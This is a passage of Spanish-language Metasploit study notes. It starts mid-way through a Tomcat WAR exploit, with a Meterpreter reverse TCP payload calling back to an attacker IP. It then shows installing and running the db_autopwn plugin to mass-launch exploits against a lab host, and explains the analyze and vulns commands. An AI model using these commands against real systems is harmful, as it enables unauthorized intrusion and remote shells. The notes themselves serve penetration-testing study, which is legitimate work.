					    `set payload java/meterpreter/reverse_tcp set LHOST 192.168.1.100 set LPORT 4444`
					    
					4. **Ejecutar el Módulo:**
					    
					    Ejecuta el módulo para intentar explotar la vulnerabilidad:
					    
					    `run`
					    
					    Si la explotación es exitosa, el archivo WAR malicioso se desplegará en el servidor y se activará el payload seleccionado, dándote acceso al servidor.
- # Plugins:
	- ## Metasploit-autopwn
		- Complemento Metasploit para un fácil ataque de vulnerabilidad y explotación.  
		
		- ### Instalar
			 1. Clone este repositorio o descargue el archivo "db_autopwn.rb"  
				
				- clone este repositorio
				
				```
				#> git clone https://github.com/hahwul/metasploit-autopwn
				```
				
				o  
				- descargue el archivo db_autopwn.rb en el directorio de complementos de metasploit
				
				```
				#> wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
				```
			
			2. Mueva el archivo dB_autopwn.rb al directorio de complementos de metasploit
				
			```
			#> cd metasploit-autopwn
			```
			
			```
			#> cp db_autopwn.rb /usr/share/metasploit-framework/plugins
			```
			
			o (instalar ruta)
			
			```
			#> cp db_autopwn.rb /opt/metasploit-framework/plugins
			```
		- ### Uso
				
			```
			#> msfconsole
			MSF > load db_autopwn
			[*] Successfully loaded plugin: db_autopwn
			
			MSF > db_autopwn -p -R great -e -q 192.168.56.101 
			[-] The db_autopwn command is DEPRECATED
			[-] See http://r-7.co/xY65Zr instead
			[*] (1/1301 [0 sessions]): Launching exploit/bsdi/softcart/mercantec_softcart against 192.168.56.44:80...
			[*] (2/1301 [0 sessions]): Launching exploit/freebsd/http/watchguard_cmd_exec against 192.168.56.44:80...
			[*] (3/1301 [0 sessions]): Launching exploit/linux/antivirus/escan_password_exec against 192.168.56.44:80...
			[*] (4/1301 [0 sessions]): Launching exploit/linux/http/accellion_fta_getstatus_oauth against 192.168.56.44:80...
			[*] (5/1301 [0 sessions]): Launching exploit/linux/http/advantech_switch_bash_env_exec against 192.168.56.44:80...
			```
- # Comandos:
	- ## Analyze:
		- El comando `analyze` en Metasploit es una herramienta integrada en el framework diseñada para realizar un análisis de vulnerabilidades sobre un objetivo. Este comando automatiza el proceso de detección de vulnerabilidades al ejecutar una serie de módulos de exploración y análisis contra un sistema objetivo.

		- ### ¿Qué Hace el Comando `analyze`?
			
			- Cuando ejecutas `analyze`, Metasploit:
				
				1. **Escanea Puertos Abiertos**: Primero, realiza un escaneo de puertos para identificar qué servicios están disponibles en el objetivo.
				    
				2. **Identificación de Servicios**: Luego, intenta identificar los servicios y versiones de software que se están ejecutando en los puertos abiertos (usando técnicas de fingerprinting).
				    
				3. **Prueba de Módulos de Vulnerabilidad**: Basándose en la información obtenida sobre los servicios y versiones detectadas, Metasploit selecciona y ejecuta automáticamente módulos de explotación o de detección de vulnerabilidades contra esos servicios.
				    
			
		- ### Cómo Usar el Comando `analyze`
			
			1. **Configurar el Objetivo**: Antes de ejecutar `analyze`, necesitas especificar la dirección IP del objetivo:
			    			    
			    `set RHOSTS <direccion_ip_del_objetivo>`
			    
			2. **Ejecutar el Comando `analyze`**:
			    
			    `analyze`
			    
			    Metasploit comenzará a escanear el objetivo, identificar servicios y lanzar los módulos relevantes.
			    
			3. **Revisar los Resultados**: Después de completar el análisis, Metasploit te proporcionará un resumen de las vulnerabilidades detectadas y, en algunos casos, recomendaciones sobre qué exploits pueden ser utilizados para aprovechar esas vulnerabilidades.
			    

		- ### Opciones del Comando `analyze`

			- Puedes modificar el comportamiento del comando `analyze` utilizando opciones adicionales:
				
				- **`-j` o `--jobs`**: Ejecuta los módulos de análisis en segundo plano.
				- **`-p <puerto>`**: Especifica un puerto específico para analizar.
				- **`-s <servicio>`**: Especifica un servicio en particular (como `http`, `ftp`, `ssh`) para centrarse en ese análisis.
				- **`-i <modulo>`**: Especifica un módulo de Metasploit en particular para ejecutar como parte del análisis.
	- ## Vulns:
		- El comando `vulns` en Metasploit es una herramienta útil para gestionar y visualizar las vulnerabilidades que han sido descubiertas en los sistemas objetivo durante una sesión de explotación o reconocimiento. Este comando te permite ver un resumen de las vulnerabilidades conocidas que han sido identificadas en el objetivo, facilitando así la priorización de los exploits que podrían utilizarse para comprometer el sistema.

		- ### Uso Básico del Comando `vulns`
			
			- Cuando estás en una sesión de Metasploit, puedes utilizar el comando `vulns` para listar todas las vulnerabilidades asociadas con los hosts que se encuentran en la base de datos de Metasploit. Este comando se utiliza de la siguiente manera:
				`vulns`
		
		- ### ¿Qué Hace Exactamente el Comando `vulns`?
			
			- El comando `vulns` accede a la base de datos interna de Metasploit, donde se almacena información recopilada durante el escaneo de vulnerabilidades. Esta base de datos puede haber sido poblada utilizando módulos de escaneo de vulnerabilidades, como el `auxiliary/scanner/vulnerabilities`, o herramientas de terceros integradas con Metasploit, como Nexpose o Nessus.
			
			- Cuando ejecutas `vulns`, Metasploit muestra un resumen de todas las vulnerabilidades conocidas para los hosts que han sido escaneados. Este resumen incluye información como:
				
				- **Host**: La dirección IP del sistema objetivo.
				- **Servicio/Aplicación Vulnerable**: El servicio específico o la aplicación que contiene la vulnerabilidad.
				- **CVE**: El identificador del CVE (Common Vulnerabilities and Exposures), si está disponible.
				- **Nombre de la Vulnerabilidad**: Una breve descripción o nombre de la vulnerabilidad.
				- **Referencia del Exploit**: En algunos casos, una referencia a un exploit disponible en Metasploit o en otros recursos.